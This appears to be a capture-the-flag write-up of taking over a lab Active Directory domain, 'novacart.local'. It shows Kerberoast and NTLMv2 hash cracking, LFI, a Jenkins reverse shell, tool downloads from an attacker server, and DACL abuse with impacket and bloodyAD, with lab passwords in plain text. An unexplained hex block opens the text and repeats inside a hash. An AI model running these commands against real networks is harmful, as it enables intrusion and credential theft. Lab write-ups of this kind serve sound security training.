e8701a4186f94142e93eae9d0617b9f978b1694d1b0ba4563995946e035787a60c45c3f67fd02cbcd495ca2fbc6c6f07a6ecb06bde43e6ae135071c5af8e27b9de3b253a056060d04ef996b2dc9d8c999fc82b39297cc8be7a54e4de80f24dc1497348956023f4cbd07122d5b410f627f579f3140e5520daefd30b66961f1466960b526261686d2d505da68661081f0f68388d2567eb225ce29035b220ee2d7e765c1a9857fe62070bd0a7922c1758f51907a60d09ed40d85d2b5078a58ce8b4b1d66f8ed1ad7aafd0e1f55f9a91634a1722d1bbb9438abf633f9cfa1867f5b2a5dda2fcf0a57f4adb6abab6186e9c804fb56f375097b1ea33dc3bf0124e0f216ca0f4ec1ac4b7d06775faca43d0daf75a50265aec2aed80227cc356311471af338340eb59ac8cf6b723c84
```
I will now perform kerberoasting again and i now have another hash here to try and crack

`m.brown` hash did not crack earlier

## Cracking the hash

```python
hashcat targ-kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*j.bronski$NOVACART.LOCAL$novacart.local\j.bronski*$1ac18c311b2486378fce21bc341fc30f$91d68a323d4a0c29f1c34b28997221b1c1ebe485b295b0b68c9a21af7c7fd8ee4d6846a856653376565bca9b29e95cb5af5f864fc5049591e622fd7bb43b6b44db444df02765622220bd02f5afdfeee7a7288253d06264efa658d04ee9b84d6b3848b99919d92182a0803c4797fbe1123e01394eb1a6346b2a9e2a0a3abb3c5d7d4ab9cd8eb3f53ea68fa4122b5474ba50dca3b487ecdc6c9ba015c69f1254b0eeaa01c4e03ba82fffe8418ec15fee7948d0bcc8d29c9ece2eedf0426570de84c0725aab61285aac8f08fc9a0febcef80af717c1155487041bf27829f13357c678ef3d1399225afa8352c1eca3a6a29aae0e6490df59f60075add05e091058968cc96ea164837de0ad1d9d6526ab1bde82948ff99308d320a05840d32e9a9436ae59ff39d72683c177a9bc78168a619b97d148acd8761e21a3186366adfaabcaf05bf7f92414108f7c87aecbcd0045acb3e22007a693b347cd64de620f10d16d1870231e1102457cd40af1e48761bbab4c4175ac96e9ef055e854a708a864233d2ddc50ede00b4e834004d1aff32a736731fe24cc4a822d7de6df01536bba700fd432ac211659c12fa7dc0d74c1ee0bcc0cf8a9271e299c95148f8d740d9f6bbff0e6a84486507af2aa05ad50ade3193aa1841ee4fbaa37c965ec36ded19296f8bf3ac56fc0c6341f1efe5295e6d85cfa58f69c4f20e4c3b3a0fcd551a61bfacb5eb76f0272463e0232e65ba10f1ed21d98b3816022344c2a159271fed8d51e500f4de058b8c56821d2b926d9cdd3f91e349e1b4c8fe92f62452d07488f42a9234b148eca4a53699ed0f16ec1544785063f113f997e49a40a4f81d8658e13143b6493a79692c9f44247443d8d7c3a5b0dc43951019a1cc1d527f8a2ba61d7c4a2b81044b1516aca9d193bc714ea1333ef2a5103136bb6733f30d02ab1058061bbe5f4b8aad205bb85487e9f2d843ea3ead0aa4aca49217365d2b7705470347bd82c300f79f55af9943d102622a26ca7ec1bb9cdf49bffa2301255c1e11981282d67ff61cc20381e8da8b9b1b0be6dcf9da21eb38cbda8bdee3947b996c81f8e9be2e4e4ae6a70661c13bb2bde830c80a30567c8c519698f5ac6ff8a391a19574b58c78a693fe8701a4186f94142e93eae9d0617b9f978b1694d1b0ba4563995946e035787a60c45c3f67fd02cbcd495ca2fbc6c6f07a6ecb06bde43e6ae135071c5af8e27b9de3b253a056060d04ef996b2dc9d8c999fc82b39297cc8be7a54e4de80f24dc1497348956023f4cbd07122d5b410f627f579f3140e5520daefd30b66961f1466960b526261686d2d505da68661081f0f68388d2567eb225ce29035b220ee2d7e765c1a9857fe62070bd0a7922c1758f51907a60d09ed40d85d2b5078a58ce8b4b1d66f8ed1ad7aafd0e1f55f9a91634a1722d1bbb9438abf633f9cfa1867f5b2a5dda2fcf0a57f4adb6abab6186e9c804fb56f375097b1ea33dc3bf0124e0f216ca0f4ec1ac4b7d06775faca43d0daf75a50265aec2aed80227cc356311471af338340eb59ac8cf6b723c84:jan162005
```
This hash cracked

```python
j.brokski:jan162005
```
Ill now validate these credentials

```python
nxc smb dc.novacart.local -u j.bronski -p 'jan162005'
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\j.bronski:jan162005
```
This user is now compromised

Since this user is part of the web operators i think it might get me access to the webserver running on port 5000

![1044](Pasted%20image%2020260501193850.png)

I now have access to this page!

There is an IT management portal and there is an error saying `Error reading file: Thread was being aborted.` 

It is passing a file in the URL so maybe vulnerable to LFI

It is not vulnerable to RFI

So when trying to access /boot.ini i get this error

![](Pasted%20image%2020260501194455.png)

So it is searching for files in the webroot

![](Pasted%20image%2020260501194603.png)

Using `../` i can escape it, but in this case i dont think the file itself exists

Ill access the `Shares` share to see if there is anything interesting


# `Shares` share

```python
cat ticket_101_jenkins_config.txt 
Ticket ID: 115
Subject: Jenkins configuration update

The jenkins.ini file currently deployed appears to be the one used during testing.
Please replace it with the correct production configuration to ensure proper operation.

Status: Pending
Assigned to: DevOps
```
So ive downloaded all the files from the `shares` share and found this interesting message

I can try to access this file via LFI

# LFI to access `jenkins.ini` file

![](Pasted%20image%2020260501201548.png)

Looks like ive found a valid logon

```python
jbronski:1novatech
```

Ill try to logon to jenkins

# Access to jenkins instance

![](Pasted%20image%2020260501201726.png)

The credentials found gave me access to the jenkins instance

![](Pasted%20image%2020260501201815.png)

Found the version

# Reverse shell using groovy script

https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

I can use the script console in jenkins to get a reverse shell

![](Pasted%20image%2020260501202029.png)

Ill change the IP and the port

```python
penelope -p 443                  
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.1.157 • 10.200.52.144
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```
Ill set a listener

Then ill run the code

```python
penelope -p 443                  
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.1.157 • 10.200.52.144
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => DC 10.0.18.23 Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC 👤 novacart\svc_jenkins 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kali/.penelope/sessions/DC~10.0.18.23-Microsoft_Windows_Server_2019_Standard_Evaluation-x64-based_PC/2026_05_01-20_22_25-175.log
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Program Files\Jenkins>whoami
whoami
novacart\svc_jenkins

C:\Program Files\Jenkins>
```
i now have a reverse shell as the svc_jenkins user

# Uploading sharphound

So after looking around for a while, im going to try upload sharphound to see if it give me any extra information

```python
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Ill start a web server

```python
curl http://10.200.52.144:8000/SharpHound.exe._obf.exe -o sharphound-obf.exe
PS C:\temp> dir
dir


    Directory: C:\temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         5/1/2026  12:46 PM         734720 sharphound-obf.exe                                                    


PS C:\temp> 
```
Now its on the target

```python
PS C:\temp> .\sharphound-obf.exe -c All
```
This executed it

```python
PS C:\temp> cp 20260501124938_BloodHound.zip C:\Shares
cp 20260501124938_BloodHound.zip C:\Shares
PS C:\temp>
```
This made the output accessible over SMB so i can download it

```python
smbclient //dc.novacart.local/Shares -U 'j.bronski'%'jan162005'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  Dn        0  Fri May  1 20:49:54 2026
  ..                                 Dn        0  Fri May  1 20:49:54 2026
  20260501124938_BloodHound.zip      An    14725  Fri May  1 20:49:39 2026
  Backup                             Dn        0  Wed Dec 31 20:28:53 2025
  CREDHIST                         AHSn       24  Tue Dec 23 10:35:20 2025
  IT_Tickets                         Dn        0  Wed Apr 15 19:52:38 2026
  Tools                              Dn        0  Sat Feb 21 18:14:43 2026

		12966143 blocks of size 4096. 6281055 blocks available
smb: \> get 20260501124938_BloodHound.zip
getting file \20260501124938_BloodHound.zip of size 14725 as 20260501124938_BloodHound.zip (36.4 KiloBytes/sec) (average 36.4 KiloBytes/sec)
smb: \> 
```
Now ill re-ingest the data!

# Bloodhound after sharphound collection

![](Pasted%20image%2020260501205234.png)

I can see there is a user that has a session i can use remotepotato to steal the users NTLM hash

# RemotePotato leads to user compromise

```python
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Ive downloaded remotepotato from github

And now ill host a web server to transfer the file

```python
PS C:\temp> curl http://10.200.52.144:8000/RemotePotato0.exe -o rp.exe
curl http://10.200.52.144:8000/RemotePotato0.exe -o rp.exe
```
Now its on the target

```python
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.18.23:9001
```
Ill set a socat listener

Using the target IP

```python
PS C:\temp> ./rp.exe -m 2 -s 1 -x 10.200.52.144 -p 9001
./rp.exe -m 2 -s 1 -x 10.200.52.144 -p 9001
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9001
[*] Example Network redirector: 
	sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9001
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9001 ... 
[*] IStoragetrigger written: 108 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9001
[+] User hash stolen!

NTLMv2 Client	: DC
NTLMv2 Username	: NOVACART\j.dillon
NTLMv2 Hash	: j.dillon::NOVACART:11f76ab02945f33a:630cb863d5b9e362b8b157fa8ce476f8:0101000000000000bdb3611da5d9dc01b7704f2138f6881300000000020010004e004f00560041004300410052005400010004004400430004001c006e006f007600610063006100720074002e006c006f00630061006c0003002200440043002e006e006f007600610063006100720074002e006c006f00630061006c0005001c006e006f007600610063006100720074002e006c006f00630061006c0007000800bdb3611da5d9dc01060004000600000008003000300000000000000001000000002000006448886a2f8b67717d7f26147e821e872bab76dfd3218aef2b4b5bf514b9039d0a00100000000000000000000000000000000000090000000000000000000000
```
Now i have the NTLMv2 hash for the user `j.dillon`

## Cracking the hash

```python
hashcat j-dillon.hash /usr/share/wordlists/rockyou.txt

J.DILLON::NOVACART:11f76ab02945f33a:630cb863d5b9e362b8b157fa8ce476f8:0101000000000000bdb3611da5d9dc01b7704f2138f6881300000000020010004e004f00560041004300410052005400010004004400430004001c006e006f007600610063006100720074002e006c006f00630061006c0003002200440043002e006e006f007600610063006100720074002e006c006f00630061006c0005001c006e006f007600610063006100720074002e006c006f00630061006c0007000800bdb3611da5d9dc01060004000600000008003000300000000000000001000000002000006448886a2f8b67717d7f26147e821e872bab76dfd3218aef2b4b5bf514b9039d0a00100000000000000000000000000000000000090000000000000000000000:novafire2008
```
The hash cracked

```python
j.dillon:novafire2008
```
Ill validate these credentials

```python
nxc smb dc.novacart.local -u j.dillon -p 'novafire2008'       
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\j.dillon:novafire2008
```
This user is compromised!

No extra access on SMB shares

# Bloodhound on `j.dillon`

![](Pasted%20image%2020260501210609.png)

I have WriteOwner on `IT HELPDESK` which means i should be able to assign GenericAll to myself

# Abusing WriteOwner on `IT HELPDESK`

https://www.hackingarticles.in/abusing-ad-dacl-writeowner/

```python
impacket-owneredit -action write -new-owner 'j.dillon' -target-dn 'CN=IT HELPDESK,CN=USERS,DC=NOVACART,DC=LOCAL' 'novacart.local'/'j.dillon':'novafire2008' -dc-ip 10.0.18.23
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-3314170591-2632404997-3798122088-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=novacart,DC=local
[*] OwnerSid modified successfully!
```
Now ive modified the owner

```python
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'j.dillon' -target-dn 'CN=IT HELPDESK,CN=USERS,DC=NOVACART,DC=LOCAL' 'novacart.local'/'j.dillon':'novafire2008' -dc-ip 10.0.18.23
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260501-211648.bak
[*] DACL modified successfully!
```
Now i should be able to add myself to the group

```python
bloodyAD --host dc.novacart.local -d novacart.local -u j.dillon -p 'novafire2008' add groupMember 'IT helpdesk' 'j.dillon'    

[+] j.dillon added to IT helpdesk
```
The current user is now in the helpdesk group

# Bloodhound on `IT HELPDESK`

![923](Pasted%20image%2020260501211949.png)

I have ForceChangePassword on 6 users

The user `l.thompson` is the most interesting, he is part of the remote management users group


# Compromising `l.thompson`

```python
net rpc password "l.thompson" 'Password123!' -U "novacart.local"/"j.dillon"%'novafire2008' -S "10.0.18.23"
```
Now im part of the group i can change the users password

Now i can winrm in FINALLY!

```python
nxc smb dc.novacart.local -u l.thompson -p 'Password123!'                                                       
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [-] novacart.local\l.thompson:Password123! STATUS_ACCOUNT_DISABLED
```
No i was wrong!

The account is disabled so ill need to re-enable somehow

## Re-enabling `l.thompson`

So ill run through the writeable objects across my compromised accounts so far

```python
bloodyAD --host DC.novacart.local -d novacart.local -u d.barowski -p 'kubarow' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=novacart,DC=local
permission: WRITE

distinguishedName: CN=Jan Bronski,CN=Users,DC=novacart,DC=local
permission: WRITE

distinguishedName: CN=David Barowski,CN=Users,DC=novacart,DC=local
permission: WRITE

distinguishedName: CN=J Paul,CN=Users,DC=novacart,DC=local
permission: WRITE

distinguishedName: CN=M Ruehl,CN=Users,DC=novacart,DC=local
permission: WRITE

distinguishedName: CN=D Winkler,CN=Users,DC=novacart,DC=local
permission: WRITE

distinguishedName: CN=Lois Thompson,CN=Users,DC=novacart,DC=local
permission: WRITE
```
So as seen here a previously compromised user is able to re-enable the account of `l.thompson`


```python
bloodyAD --host  DC.novacart.local -d 'novacart.local' -u 'd.barowski' -p 'kubarow' remove uac 'l.thompson' -f ACCOUNTDISABLE
[+] ['ACCOUNTDISABLE'] property flags removed from l.thompson's userAccountControl
```
The account should now be enabled so ill log in via WINRM

## Access over WINRM

```python
evil-winrm -i dc.novacart.local -u l.thompson -p 'Password123!'                                           
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\l.thompson\Documents> whoami
novacart\l.thompson
*Evil-WinRM* PS C:\Users\l.thompson\Documents>
```
Now im logged in as this user!

# Powershell history leads to user compromise

```python
*Evil-WinRM* PS C:\Users\l.thompson\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> download ConsoleHost_history.txt
                                        
Info: Downloading C:\Users\l.thompson\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt to ConsoleHost_history.txt
                                        
Info: Download successful!
```
Found a powershell history file

```python
cat ConsoleHost_history.txt      
cd C:\Users\l.thompson\Desktop
Remove-Item *.eml -Force
rm Groups_credentials.xml
```
Looks like there is some deleted items here i could possible restore!

So ill check out recycle bin

```python
*Evil-WinRM* PS C:\Users\l.thompson\Desktop> dir -force 'C:\$Recycle.Bin\S-1-5-21-3314170591-2632404997-3798122088-1129'


    Directory: C:\$Recycle.Bin\S-1-5-21-3314170591-2632404997-3798122088-1129


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/16/2026  12:08 PM            150 $IXJMTOZ.eml
-a----        3/16/2026  12:03 PM            130 $IY0735O.xml
-a----        3/16/2026  11:55 AM            118 $IYH1PD0.xml
-a----        3/16/2026  11:58 AM            582 $RXJMTOZ.eml
-a----        3/16/2026  11:40 AM           6823 $RY0735O.xml
-a-hs-        3/15/2026   9:10 AM            129 desktop.ini


*Evil-WinRM* PS C:\Users\l.thompson\Desktop> 
```
Here are all the files mentioned

```python
*Evil-WinRM* PS C:\Users\l.thompson\Desktop> Copy-Item 'C:\$Recycle.Bin\S-1-5-21-3314170591-2632404997-3798122088-1129\$RY0735O.xml' RY0735O.xml
*Evil-WinRM* PS C:\Users\l.thompson\Desktop> download RY0735O.xml
                                        
Info: Downloading C:\Users\l.thompson\Desktop\RY0735O.xml to RY0735O.xml
                                        
Info: Download successful!
```
Ill download all the files using the same method as i did above

```python
cat RY0735O.xml                                                  


				</Times>
				<String>
					<Key>Notes</Key>
					<Value></Value>
				</String>
				<String>
					<Key>Password</Key>
					<Value ProtectInMemory="True">pa$$w0rd7383</Value>
				</String>
				<String>
					<Key>Title</Key>
					<Value></Value>
				</String>
				<String>
					<Key>URL</Key>
					<Value></Value>
				</String>
				<String>
					<Key>UserName</Key>
					<Value>j.clark</Value>
				</String>
				<AutoType>
					<Enabled>True</Enabled>
					<DataTransferObfuscation>0</DataTransferObfuscation>
				</AutoType>
				<History />
			</Entry>

				</Times>
				<String>
					<Key>Notes</Key>
					<Value></Value>
				</String>
				<String>
					<Key>Password</Key>
					<Value ProtectInMemory="True">safEpAss69</Value>
				</String>
				<String>
					<Key>Title</Key>
					<Value></Value>
				</String>
				<String>
					<Key>URL</Key>
					<Value></Value>
				</String>
				<String>
					<Key>UserName</Key>
					<Value>cliff.b</Value>
				</String>
				<AutoType>
					<Enabled>True</Enabled>
					<DataTransferObfuscation>0</DataTransferObfuscation>
				</AutoType>
				<History />
			</Entry>

				</Times>
				<String>
					<Key>Notes</Key>
					<Value></Value>
				</String>
				<String>
					<Key>Password</Key>
					<Value ProtectInMemory="True">pa$$w0rd7383</Value>
				</String>
				<String>
					<Key>Title</Key>
					<Value></Value>
				</String>
				<String>
					<Key>URL</Key>
					<Value></Value>
				</String>
				<String>
					<Key>UserName</Key>
					<Value>m.hughes</Value>
				</String>
				<AutoType>
					<Enabled>True</Enabled>
...[SNIP]...
```
Found some credentials in the xml file 

```python
j.clark:pa$$w0rd7383
cliff.b:safEpAss69
m.hughes:pa$$w0rd7383
```

I also found an interesting note:

```python
cat RXJMTOZ.eml                                                  
Hello Louis,

Following your recent transfer to another department and your departure from the IT team, please ensure that all permissions previously assigned to you are reset accordingly.

Additionally, I ask that you remove any notes, stored data, or documentation you may still have related to the **Directory OPS** group.

If there are any files, backups, or credentials connected to this group on your workstation or personal directories, please delete them as part of the cleanup process.

Let me know once this has been completed.

Best regards,
Administrator
```

All of the credentials are valid

# Bloodhound on newly compromised users

![](Pasted%20image%2020260502002009.png)

`cliff.b` is the only user with interesting permissions

`cliff.b` is also part of the remote maangement users group

The other two users are not interesting in terms of permissions

# Evil-winrm access as `cliff.b`

```python
evil-winrm -i dc.novacart.local -u cliff.b -p 'safEpAss69'     
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\cliff.b\Documents>
```
I now have remote access to `cliff.b`

```python
*Evil-WinRM* PS C:\Users\cliff.b\Desktop> type INC-111_SeniorDevOps_ACL_Fix.eml
From: Administrator <administrator@novacart.local>
To: cliff.b@novacart.local
Subject: Temporary Workaround for Senior DevOps ACL Permissions
Date: Tue, 26 Apr 2026 16:00:00 +0200
Content-Type: text/plain; charset="UTF-8"

Hi Cliff,

Following your report regarding the missing access rights for the Senior DevOps role within the novacart.local domain, we’ve confirmed that the required ACL entries on the corresponding Organizational Unit are currently not fully applied.

As a temporary workaround, you can use the provided PowerShell scripts to trigger a scheduled task that applies the required Write All Properties permissions on the Senior DevOps OU in novacart.local.

Please proceed as follows:

1. Save the following PowerShell scripts locally on your system:
   - Configure-OUDelegation.ps1
   - check_ou_permissions.ps1
   - enum_ou_groups.ps1

2. Run the scripts from your user context.
   These scripts will create and trigger a scheduled task to apply the necessary permissions within the domain.

3. Even without administrative privileges, this works because it uses COM, allowing interaction with and execution of the scheduled task.

4. After execution, verify the applied permissions using:
   - check_ou_permissions.ps1
   - enum_ou_groups.ps1

This should restore your required access temporarily while we work on a permanent fix in the novacart.local Active Directory environment.

Let me know if anything is unclear or if you encounter any issues.

Best regards,
Administrator
NovaCart IT Department
*Evil-WinRM* PS C:\Users\cliff.b\Desktop>
```

So it appears that something is broken with the ACL entried for an OU called the senior dev ops

![](Pasted%20image%2020260503172932.png)

This OU contains some high value users and two of them have outbound object control

```python
*Evil-WinRM* PS C:\Users\cliff.b> *Evil-WinRM* PS C:\Users\cliff.b> dir
 
 
    Directory: C:\Users\cliff.b
 
 
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        4/25/2026   3:19 PM                Desktop
d-r---        3/17/2026  10:51 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-----        3/17/2026  11:34 AM                Task Scripts
```
There is an interesting directory here as well

# Assigning new privileges to senior dev ops OU

```python
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> dir


    Directory: C:\Users\cliff.b\Task Scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/17/2026  10:03 AM            946 check_ou_permissions.ps1
-a----        3/17/2026  11:44 AM            312 Configure-OUDelegation.ps1
-a----        3/17/2026  11:06 AM            806 enum_ou_groups.ps1
```
These look to be the scripts the above email was talking about!

Ill have a look at these scripts and see what they actually do!

```python
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> type Configure-OUDelegation.ps1
# Triggers a SYSTEM-level scheduled task that modifies permissions on the Senior Dev Ops OU, granting rights to members of the Directory Ops group.

$service = New-Object -ComObject "Schedule.Service"
$service.Connect()

$task = $service.GetFolder("\").GetTask("Configure-OUDelegation")
$task.Run($null)
```
This looks to the script that will modify the rights to give me some permissions over the senior dev ops OU

The `check_ou_permissions.ps1` script will just tell me what permissions i have over the dev ops OU and the senior dev ops OU

So if i run this now, the expected result would be GenricAll on dev ops OU and none on the senior dev ops OU

```python
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> .\check_ou_permissions.ps1

===== Checking OU: OU=Senior Dev Ops,DC=novacart,DC=local =====

===== Checking OU: OU=Dev Ops,DC=novacart,DC=local =====
Match found!
Principal : NOVACART\Directory Ops
Rights    : GenericAll
Type      : Allow
Inherited : False
-----------------------------------
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts>
```
The output is exactly as expected!

But by executing the `Configure-OUDelegation.ps1` and re-running this should show new permissions on the senior dev ops OU

```python
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> .\enum_ou_groups.ps1

===== OU: OU=Senior Dev Ops,DC=novacart,DC=local =====

User: l.forta
  -> CN=Identity_Admins,CN=Users,DC=novacart,DC=local

User: p.bruce
  -> CN=Identity_Admins,CN=Users,DC=novacart,DC=local

User: m.mignola
  -> CN=Unix_Support,CN=Users,DC=novacart,DC=local
  -> CN=Remote Desktop Users,CN=Builtin,DC=novacart,DC=local

===== OU: OU=Dev Ops,DC=novacart,DC=local =====

User: t.morris
  -> No group memberships

User: l.harrow
  -> No group memberships
```
So `m.mignola` is probably the user i want to be targeting here!


```python
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> .\Configure-OUDelegation.ps1


Name          : Configure-OUDelegation
InstanceGuid  : {D464EA73-8DF9-4D0F-A670-E51EAC08CF3B}
Path          : \Configure-OUDelegation
State         : 4
CurrentAction : powershell.exe
EnginePID     : 1600
```
So now ive executed this i should have some permissions on the senior dev ops OU


```python
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> .\check_ou_permissions.ps1

===== Checking OU: OU=Senior Dev Ops,DC=novacart,DC=local =====
Match found!
Principal : NOVACART\Directory Ops
Rights    : DeleteChild, WriteProperty
Type      : Allow
Inherited : False
-----------------------------------

===== Checking OU: OU=Dev Ops,DC=novacart,DC=local =====
Match found!
Principal : NOVACART\Directory Ops
Rights    : GenericAll
Type      : Allow
Inherited : False
-----------------------------------
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> 
```
So now it is returning some rights over the senior dev ops OU

Specifically it is `DeleteChild` and `WriteProperty`

It may be a good idea to re-collect bloodhound data now

So ill upload sharphound

# Analysis of new privileges on bloodhound

```python
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> upload SharpHound.exe._obf.exe
                                        
Info: Uploading /home/kali/hsm/novacart/SharpHound.exe._obf.exe to C:\Users\cliff.b\Task Scripts\SharpHound.exe._obf.exe
                                        
Data: 979624 bytes of 979624 bytes copied
                                        
Info: Upload successful!
```
Now its uploaded ill execute it!


```python
*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> .\SharpHound.exe._obf.exe -c All

...[SNIP]...

*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> download 20260503094651_BloodHound.zip
                                        
Info: Downloading C:\Users\cliff.b\Task Scripts\20260503094651_BloodHound.zip to 20260503094651_BloodHound.zip
                                        
Info: Download successful!
```
Here i am executing it and then downloading the data

So now ill re-ingest the data into bloodhound

![](Pasted%20image%2020260503175007.png)

Now after re-ingesting the bloodhound data i have GenericWrite on the users from the senior dev ops OU

So i could try Targeted Kerberasting or shadow credentials on these three new users but instead ill move the highest value target in this case `m.mignola` to the dev ops OU this should grant me GenericAll over `m.mignola` due to inheritance

I did a similar thing in the City Council machine on hacksmarter

# Moving `m.mignola` from senior dev ops to dev ops

```python
cat mmignola-move.ldif     
dn: CN=MIKE MIGNOLA,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL
changetype: moddn
newrdn: CN=MIKE MIGNOLA
deleteoldrdn: 1
newsuperior: OU=DEV OPS,DC=NOVACART,DC=LOCAL
```
Ill start by making the .ldif file, giving it the DN of `m.mignola` then the new DN


```python
ldapmodify -H ldap://dc.novacart.local -D 'cliff.b@novacart.local' -w 'safEpAss69' -f mmignola-move.ldif
modifying rdn of entry "CN=MIKE MIGNOLA,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL"
```
Now the user should have been moved i should have GenericAll over them!


With GenericAll privs i should now be able to change the users password

```python
nxc smb dc.novacart.local -u cliff.b -p 'safEpAss69' -M change-password -o NEWPASS='Password123!'
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\cliff.b:safEpAss69 
CHANGE-P... 10.0.18.23      445    DC               [+] Successfully changed password for cliff.b
```
So stupidly, i accidentally forgot to specify the target user for the password change so this has changed `cliff.b` password

But i can still change `m.mignola` password, ill just have to use the updated password of cliff.b

```python
nxc smb dc.novacart.local -u cliff.b -p 'Password123!' -M change-password -o USER=m.mignola NEWPASS='Password123!'
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\cliff.b:Password123! 
CHANGE-P... 10.0.18.23      445    DC               [+] Successfully changed password for m.mignola
```
Now the users password has been changed!

```python
nxc smb dc.novacart.local -u m.mignola -p 'Password123!'                                                          
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\m.mignola:Password123!
```
The user is now compromised!

Looking back at bloodhound its also worth noting the other two users in the senior dev ops OU have AddMember to the protected users group

![](Pasted%20image%2020260503181228.png)

![](Pasted%20image%2020260503181249.png)

Looking in the protected users group there is one user m.ibabao, as previously identified earlier when i saw the account restriction, with AddMember i should also be able to remove the user from the group!

# Unix support group

So as previously identified `m.mignola` was the highest value since they were part of this group

```python
Description:

Members of this group provide support for Unix/Linux-based environments and have access to Windows Subsystem for Linux (WSL) instances for application testing and validation
```
Checking bloodhound the group has a interesting description!

They are also part of remote desktop so ill get access over RDP

# RDP access as `m.mignola`

```python
as discussed, the WSL Linux environment remains part of our workflow for testing NovaCart components under Linux. The database is running locally within WSL to simulate real-world conditions in an isolated setup.

We are also testing the webshop on a local Apache server (port 8000), strictly for internal development.

Administrative access to the Linux root account is managed by Andrew Collins. For root credentials, please contact him directly at:
[andrew.collins@novacart.local](mailto:andrew.collins@novacart.local)

Hopefully, he didn’t reuse the same password for other accounts this time.

No external SSH access is required — all connections should be performed locally.

Update:

An initial version of the NovaCart Mobile App has been developed. The database connection is not yet implemented, and the current products are only dummy entries to demonstrate the intended layout.

We will begin proper testing once the app is connected to the local MySQL database within the WSL environment.

